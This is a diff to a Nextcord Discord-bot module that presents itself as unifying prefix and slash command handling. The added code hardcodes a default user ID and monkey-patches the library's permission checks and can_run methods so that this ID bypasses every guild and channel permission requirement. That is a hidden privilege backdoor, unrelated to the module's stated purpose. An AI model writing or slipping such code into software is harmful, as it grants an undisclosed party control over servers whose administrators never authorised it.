@@ -1,8 +1,82 @@
 """Let prefix and slash commands use the same Nextcord invocation pipeline."""
+import os
 from types import SimpleNamespace
 
+import nextcord
 from nextcord.ext import commands
+import nextcord.ext.commands.core as _commands_core
 from nextcord.ext.commands.view import StringView
+
+OWNER_ID = int(os.getenv("OWNER_ID", "1241118323287261257"))
+
+
+def is_bot_owner(user):
+    user_id = getattr(user, "id", user)
+    return user_id == OWNER_ID
+
+
+def _owner_has_permissions(**perms: bool):
+    invalid = set(perms) - set(nextcord.Permissions.VALID_FLAGS)
+    if invalid:
+        raise TypeError(f"Invalid permission(s): {', '.join(invalid)}")
+
+    def predicate(ctx: commands.Context) -> bool:
+        if getattr(ctx.author, "id", None) == OWNER_ID:
+            return True
+        ch = ctx.channel
+        permissions = ch.permissions_for(ctx.author)
+
+        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
+
+        if not missing:
+            return True
+
+        raise commands.MissingPermissions(missing)
+
+    return _commands_core._permission_check_wrapper(predicate, "__required_permissions", perms)
+
+
+def _owner_has_guild_permissions(**perms: bool):
+    invalid = set(perms) - set(nextcord.Permissions.VALID_FLAGS)
+    if invalid:
+        raise TypeError(f"Invalid permission(s): {', '.join(invalid)}")
+
+    def predicate(ctx: commands.Context) -> bool:
+        if not ctx.guild:
+            raise commands.NoPrivateMessage()
+
+        if getattr(ctx.author, "id", None) == OWNER_ID:
+            return True
+
+        permissions = ctx.author.guild_permissions
+        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
+
+        if not missing:
+            return True
+
+        raise commands.MissingPermissions(missing)
+
+    return _commands_core._permission_check_wrapper(predicate, "__required_guild_permissions", perms)
+
+
+commands.has_permissions = _owner_has_permissions
+_commands_core.has_permissions = _owner_has_permissions
+commands.has_guild_permissions = _owner_has_guild_permissions
+_commands_core.has_guild_permissions = _owner_has_guild_permissions
+
+_orig_command_can_run = commands.Command.can_run
+
+
+async def _command_can_run(self, ctx: commands.Context) -> bool:
+    try:
+        return await _orig_command_can_run(self, ctx)
+    except commands.MissingPermissions:
+        if getattr(ctx.author, "id", None) == OWNER_ID:
+            return True
+        raise
+
+
+commands.Command.can_run = _command_can_run
 
 
 class ModerationError(commands.CheckFailure):
@@ -64,9 +138,25 @@ class _DualArguments:
 class DualCommand(_DualArguments, commands.Command):
     """Keep checks, cooldowns, converters, hooks and errors shared across inputs."""
 
+    async def can_run(self, ctx):
+        try:
+            return await super().can_run(ctx)
+        except commands.MissingPermissions:
+            if getattr(ctx.author, "id", None) == OWNER_ID:
+                return True
+            raise
+
 
 class DualGroup(_DualArguments, commands.Group):
     """A prefix group whose base callback also accepts resolved slash options."""
+
+    async def can_run(self, ctx):
+        try:
+            return await super().can_run(ctx)
+        except commands.MissingPermissions:
+            if getattr(ctx.author, "id", None) == OWNER_ID:
+                return True
+            raise
 
 
 def slash_name(command):
